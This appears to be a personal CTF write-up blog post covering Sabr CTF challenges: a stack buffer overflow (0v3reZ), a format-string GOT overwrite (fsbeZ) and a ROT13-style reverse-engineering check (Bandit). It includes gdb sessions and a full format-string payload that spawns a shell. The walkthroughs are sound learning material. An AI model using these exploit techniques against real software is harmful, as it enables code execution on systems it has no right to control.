Since we can cause a buffer overflow in the binary, instead of it just exiting we can instead make it call the function that would return /bin/sh and this can be done by overwriting the RIP (Instruction Pointer Register) to call the shell function.

So i used pwntools for the exploitation but first we need to get the following things:

The offset: the amount of bytes needed to get in the rbp

The address we would want the rip to call

So for this part I used gdb .

Firstly to get the offset we need to generate bytes of data and I used cyclic tool to create 100 bytes of data

```                                      
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
└─$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```                                                                                                     

Now I opened the binary in gdb to run it

```                                   
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
└─$ gdb 0v3reZ 
GNU gdb (Debian 12.1-4) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.10
Reading symbols from 0v3reZ...
(No debugging symbols found in 0v3reZ)
gef➤  
```

Now we run it by simply typing run/r and press enter key. 

It will then require an input from us so we give it the data gotten from cyclic

```
gef➤  r
Starting program: /home/mark/Desktop/CTF/Sabr/pwn/0v3reZ/0v3reZ 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

 ▄▄████████▄ ▄███   ▄███ ▄█████████▄ ▄█████████▄ ▄▄█████████ ▄██████████
 ████▀▀▀████ ████   ████ ▀▀▀▀▀▀▀████ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
 ████   ████ ████   ████     ▄▄▄███▀ ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
 ████   ████ ████  ▄████     ▀▀▀███▄ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
 ████▄▄▄████ ████▄█████▀ ▄▄▄▄▄▄▄████ ████   ████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
 ▀█████████▀ ████████▀▀  ██████████▀ ████   ████ ▀██████████ ███████████
  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀


b0fz: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401282 in ?? ()
```

After giving it the 100 bytes of `a` it causes a segmentation fault error, then in the new line it should return the information about the registers in it's current state

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
$rax   : 0x0               
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2cb  →  "/home/mark/Desktop/CTF/Sabr/pwn/0v3reZ/0v3reZ"
$rcx   : 0x007ffff7f9ca80  →  0x00000000fbad208b
$rdx   : 0x1               
$rsp   : 0x007fffffffde58  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9ea20  →  0x0000000000000000
$rip   : 0x00000000401282  →   ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007ffff7dd72a8  →  0x00100022000043f9
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2f9  →  "COLORFGBG=15;0"
$r14   : 0x00000000403e18  →  0x000000004011a0  →   endbr64 
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x007fffffffde58│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"      ← $rsp
0x007fffffffde60│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x007fffffffde68│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x007fffffffde70│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x007fffffffde78│+0x0020: "saaataaauaaavaaawaaaxaaayaaa"
0x007fffffffde80│+0x0028: "uaaavaaawaaaxaaayaaa"
0x007fffffffde88│+0x0030: "waaaxaaayaaa"
0x007fffffffde90│+0x0038: 0x00000061616179 ("yaaa"?)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     0x401277                  call   0x4010d0 <gets@plt>
     0x40127c                  mov    eax, 0x0
     0x401281                  leave  
 →   0x401282                  ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[#0] Id 1, Name: "0v3reZ", stopped 0x401282 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[#0] 0x401282 → ret 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Now we see that we are able to overwrite most of the registers with aabbcc*

Now lets get the first four byte of the rsp register in my case its “kaaa” it should be the same for you i guess

After getting that we then do `cyclic -l kaaa` and its output is 40 that means the offset is 40.

```                                        
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
└─$ cyclic -l kaaa
40
```

Now that we have the offset, lets get the memory address we want to return to and obviously its the /bin/sh address since that will give us shell.

Using ghidra we can see the address by checking the function FUN_004011d6
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/8.png)

Address = 0x4011de

Now I made an exploit to run the binary and exploit it here’s my script [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/pwn/0v3reZ.py) 

Then on running it
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/9.png)

It worked on the remote server also 

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/10.png)

Flag: sabr{m3m0ry_c0rrup710n_iz_fUNNNNNNNNNNNN}

### fsbeZ:

I don't have the images cause the ctf's is over and i didn't take capture while i was doing it

But still I do have the binary stored in my pc

Now this is a binary that is vulnerable to format string it was also clearly indicated in the description of the task

But this took my time to solve cause I am not experienced in binary exploitation but after few days of research I was able to solve it and also got first blood 😁

So lets start then 

After downloading the binary the first thing to check is the protection enabled 

So the basic checks is by using checksec command which should i think come installed when you download pwntools library

Now lets check what kind of binary we're dealing it first

```                                        
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
└─$ file fsbeZ    
fsbeZ: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=a0cb767c851f8f64c079def426155094559930a9, for GNU/Linux 3.2.0, stripped
                                                                                                                                                                                                                   
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
└─$ checksec fsbeZ 
[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)
[*] '/home/mark/Desktop/CTF/Sabr/pwn/fsbeZ/fsbeZ'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

We are dealing with a `32BITS` binary which is `DYNAMICALLY LINKED`, `STRIPPED` (meaning we won't be able to see the real function names), has `PARTIAL RELRO`, has `STACK` enabled (so if we are to get a buffer overflow and want to jump to another address we will be stopped by stack protector), `NX` enabled ( we can't put shellcode in the stack and execute it) and lastly has no `PIE` ( meaning the base address from when the file is run will always be the same )

Now lets do run check to know what the binary requires and what it does

```                                       
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
└─$ ./fsbeZ 
 ▄▄█████████ ▄▄█████████ ▄█████████▄ ▄▄█████████ ▄██████████
 ████▀▀▀▀▀▀▀ ████▀▀▀▀▀▀▀ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
 ████▄▄▄     ████▄▄▄▄▄▄  ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
 ████▀▀▀     ▀▀▀▀▀▀▀████ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
 ████        ▄▄▄▄▄▄▄████ ████▄▄▄████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
 ████        ██████████▀ ██████████▀ ▀██████████ ███████████
 ▀▀▀▀        ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀

fsb: hello
hello
```

We see that it justs takes in our input then print it out back 

Now I then decompiled the binary using ghidra 

Function FUN_08049250 

```

void FUN_08049250(void)

{
  int iVar1;
  undefined4 *puVar2;
  int in_GS_OFFSET;
  undefined4 local_94;
  undefined4 local_90 [31];
  undefined4 local_14;
  undefined *puStack16;
  
  puStack16 = &stack0x00000004;
  local_14 = *(undefined4 *)(in_GS_OFFSET + 0x14);
  local_94 = 0;
  puVar2 = local_90;
  for (iVar1 = 0x1f; iVar1 != 0; iVar1 = iVar1 + -1) {
    *puVar2 = 0;
    puVar2 = puVar2 + 1;
  }
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x3c);
  FUN_0804921b();
  printf("fsb: ");
  fgets((char *)&local_94,0x80,stdin);
  printf((char *)&local_94);
                    /* WARNING: Subroutine does not return */
  exit(0);
}
```
Function FUN_080491e6
```

void FUN_080491e6(void)

{
  int iVar1;
  int in_GS_OFFSET;
  
  iVar1 = *(int *)(in_GS_OFFSET + 0x14);
  system("/bin/bash");
  if (iVar1 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

So the first function which is likely going to be the main takes in user input and prints it out back

There's no any form of buffer overflow cause it used fget to receive user input

But whereas it uses printf without specifying the format and prints out the input we give

The obvious thing to do is to call the /bin/bash function 

But there's no buffer overflow so we can't overwrite return address to call /bin/bash but instead we can overwrite the Global Offset Table (GOT) address for exit to 
call /bin/bash 

So what GOT does is that it stores pointers to libc function or any other external libs and therefore when a binary wants to call a function it looks into the got 
entry to find the pointer to that

Since PIE is not enabled and we dont have full relro we know where the got lives and we can write there

Therefore when you overwrite what's in the got for exit() you can make the process jump to that pointer when exit is called

And why I used want to overwrite exit() is because from the decompiled code its basically useless there instead of overwriting printf we can take advantage of the 
function that doesn't really do anything useful for us

Now lets get to the exploitation part

Firstly we need to get the offset i.e the address where the input is being stored in the stack

A fuzzing script can be used but while i tried solving it i got the offset manually

By giving it this input `AAAA%1$p` but i was incrementing the value by +1

So at offset 7 we see that the result being printed out is hex of A's meaning that our input is being stored at the 7th parameter on the stack

```
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
└─$ ./fsbeZ
 ▄▄█████████ ▄▄█████████ ▄█████████▄ ▄▄█████████ ▄██████████
 ████▀▀▀▀▀▀▀ ████▀▀▀▀▀▀▀ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
 ████▄▄▄     ████▄▄▄▄▄▄  ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
 ████▀▀▀     ▀▀▀▀▀▀▀████ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
 ████        ▄▄▄▄▄▄▄████ ████▄▄▄████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
 ████        ██████████▀ ██████████▀ ▀██████████ ███████████
 ▀▀▀▀        ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀

fsb: AAAA%7$p
AAAA0x41414141
```

Now this are the steps I took in solving this challenge
- Find the address of "/bin/bash"
- Find the address of exit() in GOT
- Find the offset of our string on the stack
- Write the proper exploit string
- Rewrite exploit using pwntools 

At this moment we have the offset of our string on the stack which is 7 

Now lets get the address of "/bin/bash" and exit() in GOT

I used ghidra to get them 

```
        080491fa 68 08 a0        PUSH       s_/bin/bash_0804a008                             = "/bin/bash"
                 04 08
        080491ff e8 9c fe        CALL       <EXTERNAL>::system                               int system(char * __command)
                 ff ff
```

Now to get the address for exit() in GOT we need to navigate to the got.plt section of the binary 

```
                             //
                             // .got.plt 
                             // SHT_PROGBITS  [0x804c000 - 0x804c02f]
                             // ram:0804c000-ram:0804c02f
                             //
                             __DT_PLTGOT                                     XREF[2]:     0804bf80(*), 
                                                                                          _elfSectionHeaders::0000037c(*)  
        0804c000 14 bf 04 08     addr       _DYNAMIC
                             PTR_0804c004                                    XREF[1]:     FUN_08049030:08049030(R)  
        0804c004 00 00 00 00     addr       00000000
                             PTR_0804c008                                    XREF[1]:     FUN_08049030:08049036  
        0804c008 00 00 00 00     addr       00000000
                             PTR___libc_start_main_0804c00c                  XREF[1]:     __libc_start_main:08049040  
        0804c00c 00 d0 04 08     addr       <EXTERNAL>::__libc_start_main                    = ??
                             PTR_printf_0804c010                             XREF[1]:     printf:08049050  
        0804c010 04 d0 04 08     addr       <EXTERNAL>::printf                               = ??
                             PTR_fgets_0804c014                              XREF[1]:     fgets:08049060  
        0804c014 08 d0 04 08     addr       <EXTERNAL>::fgets                                = ??
                             PTR_alarm_0804c018                              XREF[1]:     alarm:08049070  
        0804c018 0c d0 04 08     addr       <EXTERNAL>::alarm                                = ??
                             PTR___stack_chk_fail_0804c01c                   XREF[1]:     __stack_chk_fail:08049080  
        0804c01c 10 d0 04 08     addr       <EXTERNAL>::__stack_chk_fail                     = ??
                             PTR_puts_0804c020                               XREF[1]:     puts:08049090  
        0804c020 14 d0 04 08     addr       <EXTERNAL>::puts                                 = ??
                             PTR_system_0804c024                             XREF[1]:     system:080490a0  
        0804c024 18 d0 04 08     addr       <EXTERNAL>::system                               = ??
                             PTR_exit_0804c028                               XREF[1]:     exit:080490b0  
        0804c028 20 d0 04 08     addr       <EXTERNAL>::exit                                 = ??
                             PTR_setvbuf_0804c02c                            XREF[1]:     setvbuf:080490c0  
        0804c02c 24 d0 04 08     addr       <EXTERNAL>::setvbuf                              = ??
```

Now we have the neccessary addresses
- Address of shell ("/bin/bash") =  080491fa
- Address of exit() GOT = 0804c028
- Offset of string on stack = 7

Now the payload creation:

I’ll write 080491fa ("/bin/bash") to overwrite the value of exit() 0804c028 

Here's the resource which helped me [Resouce](https://axcheron.github.io/exploit-101-format-strings/)

Solve script available here [Exploit](https://github.com/markuched13/markuched13.github.io/blob/main/solvescript/sabr/pwn/fsbez.py)

```                                         
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
└─$ python -c 'print "\x2a\xc0\x04\x08\x28\xc0\x04\x08%2044x%7$hn%35318x%8$hn"' > payload
                                         
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
└─$ cat payload    
*(%2044x%7$hn%35318x%8$hn
```

Now to run it we can't do something like `./fsbeZ < payload` it won't work 

So instead lets run it this way 
```
(cat payload; cat) | ./fsbeZ
```

Now on running the payload on the binary it gives us a bash shell xD

```                                          
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/fsbeZ]
└─$ (cat payload; cat) | ./fsbeZ          
 ▄▄█████████ ▄▄█████████ ▄█████████▄ ▄▄█████████ ▄██████████
 ████▀▀▀▀▀▀▀ ████▀▀▀▀▀▀▀ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
 ████▄▄▄     ████▄▄▄▄▄▄  ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
 ████▀▀▀     ▀▀▀▀▀▀▀████ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
 ████        ▄▄▄▄▄▄▄████ ████▄▄▄████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
 ████        ██████████▀ ██████████▀ ▀██████████ ███████████
 ▀▀▀▀        ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀   ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀

fsb: *(                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                                                  f7e1d620
ls
exploit.py  fsbeZ  libc.so.6  payload
id
uid=1000(mark) gid=1000(mark) groups=1000(mark),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),119(wireshark),121(bluetooth),137(scanner),142(kaboxer)
ls -al
total 2264
drwxr-xr-x 2 mark mark    4096 Jan 16 22:08 .
drwxr-xr-x 8 mark mark    4096 Jan 14 13:14 ..
-rw-r--r-- 1 mark mark     395 Jan 15 04:20 exploit.py
-rwxr-xr-x 1 mark mark   13708 Jan 10 14:30 fsbeZ
-rw-r--r-- 1 mark mark 2280756 Jan 10 14:26 libc.so.6
-rw-r--r-- 1 mark mark      32 Jan 16 22:08 payload
-rw-r--r-- 1 mark mark    1024 Jan 15 00:38 .testexploit.py.swp
```                                                       
And after running the exploit code we get shell xD 


### Reverse Engineering Category 

### Bandit: 
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/re/bandit/pic.JPG)

So I downloaded the file to my machine to analyze it.

On checking the file type and protections enabled showed this
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/583f73fd-5957-4e55-9920-9b18807dfb4c)

We're working with a x64 binary which is dynamically linked and not stripped 

I ran the binary to get an overview of how it works
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/a2f4c900-a1a5-423d-9950-2d323509c886)

Hmmm seems we need to give it the right input before we get the flag?

Time to decompile and let Ghidra do it's thing 🥷
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/05d07498-a1f1-4ce1-8615-020044127820)
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/e15223e5-fbc5-44f6-ae50-0e8993537a99)

Ok Ghidra isn't making it look so readable tbh it's a pain while trying to set data types correctly

But at least it's understandable!

The basic idea of the code is that it would receive our input then pass each character of our input to the "encryption algorithm" then later being compared to some string

BTW using IDA Free (Of cause: Where's PRO illegal 👀) the code decompiled pretty neat
![image](https://github.com/h4ckyou/h4ckyou.github.io/assets/127159644/002d249c-c5b8-45e5-89ea-eaa7a034954a)

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+8h] [rbp-38h]
  int c; // [rsp+Ch] [rbp-34h]
  __int64 v6[6]; // [rsp+10h] [rbp-30h] BYREF

  v6[5] = __readfsqword(0x28u);
  banner(argc, argv, envp);
  v4 = 0;
  qmemcpy(v6, "fnoe{genfu_cnaqnf_ner_phgr}", 27);
  while ( 1 )
  {
    c = getchar();
    if ( c == -1 )
      return 0;
    if ( ((*__ctype_b_loc())[c] & 0x400) != 0 )
    {
      if ( (tolower(c) - 84) % 26 + 97 != *((char *)v6 + v4) )
        goto LABEL_4;
    }
    else if ( c != *((char *)v6 + v4) )
    {
LABEL_4:
      puts("Nope!\n");
      return -1;
    }
    if ( ++v4 > 26 )
    {
      puts("You found the flag!\n");
      return 0;
    }
  }
}
```

With that said let's just get to the way it encrypts our input

It just does that with this math operation:

```
(tolower(c) - 84) % 26 + 97
```

Hmmm converts each of our input character to lowercase (weird) then subtracts 84 from it which then mods it by 26 and adds 27 to it

Here's how I plan on solving this 

Since we basically know what it later is going to be compared to, I can do just this small math:

```
(c - 84) % 26 = encrypted[i] - 97
```

And yes then I basically try all the ascii printable characters as my `c` and compare whether it meets that equation.

If it does then we have the right flag character, then I move on to the next character till we get the full flag

Here's the python solve script:

```python
import string

# (c - 84) % 26 = encrypted[i] - 27

def check(e):
    charset = string.ascii_letters
    flag = ""

    for c in charset:
        lhs = (ord(c) - 84) % 26
        rhs = ord(e) - 97

        if lhs == rhs:
            flag += c
            break

    print(flag, end='')

def main():
    encrypted = 'fnoe{genfu_cnaqnf_ner_phgr}'

    for e in encrypted:
        check(e)


if __name__ == '__main__':
    main()

# Flag: sabr{trashpandasarecute}
```

Running that should give you the flag!

-- As you might have noticed this is really a modified solution to the way I did it then, cause while reading the way i solved it, i figured that was pure guessing and luck which isn't right. That's why i decided to give it a try again and it wasn't so hard afterall 😉

### Overview:

- This CTF was a really nice challenge which made me learn further things and not give up even though it was really painful 😂😂😂 
- Kudos to the organizers for hosting the ctf
- 
- So after all the struggle I managed to place 1st in the leaderboard scoring 1301 points overall 😅
- The username I used for the ctf is `PlsHackMe` 😅
![image](https://user-images.githubusercontent.com/113513376/212760099-7cba7eb1-92e2-457d-832f-4bedc561b83d.png)
![image](https://user-images.githubusercontent.com/113513376/212760251-f0ffcb67-dcbd-44b4-91d0-14d3beeb7578.png)


Please If I made any sort of mistake be sure to DM me on discord `Hack.You#9120`

<br> <br>
[Back To Home](../../index.md)
<br>





